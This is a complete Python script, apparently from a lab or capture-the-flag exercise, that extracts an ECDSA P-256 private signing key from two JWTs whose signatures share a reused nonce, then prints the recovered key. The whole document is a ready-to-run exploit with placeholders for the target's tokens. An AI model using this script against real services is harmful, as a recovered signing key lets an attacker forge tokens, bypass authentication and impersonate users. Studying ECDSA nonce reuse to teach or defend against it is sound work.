from ecdsa.ecdsa import generator_256, Signature
from Crypto.Util.number import bytes_to_long
import libnum, hashlib, base64

def base64_decode(data):
    padding = "=" * (4 - len(data) % 4)
    return base64.urlsafe_b64decode(data + padding)

def extract_sig(jwt):
    head, data, sig = jwt.split(".")
    msg = f"{head}.{data}"
    h = bytes_to_long(hashlib.sha256(msg.encode()).digest())
    sig_long = bytes_to_long(base64_decode(sig))
    sig_obj = Signature(sig_long >> 256, sig_long % (2 ** 256))
    return h, sig_obj

def recover_private_key(jwt1, jwt2):
    h1, sig1 = extract_sig(jwt1)
    h2, sig2 = extract_sig(jwt2)
    
    r1, s1 = sig1.r, sig1.s
    r2, s2 = sig2.r, sig2.s
    
    G = generator_256
    q = G.order()
    
    valinv = libnum.invmod(r1 * (s1 - s2), q)
    d = (((s2 * h1) - (s1 * h2)) * valinv) % q
    
    return d

# Create two JWT tokens and Update it below 
jwt1 = "<Your First JWT Here>"
jwt2 = "<Your Second JWT Here>"

# Recover private key
d = recover_private_key(jwt1, jwt2)
print("Recovered private key (d):", d)
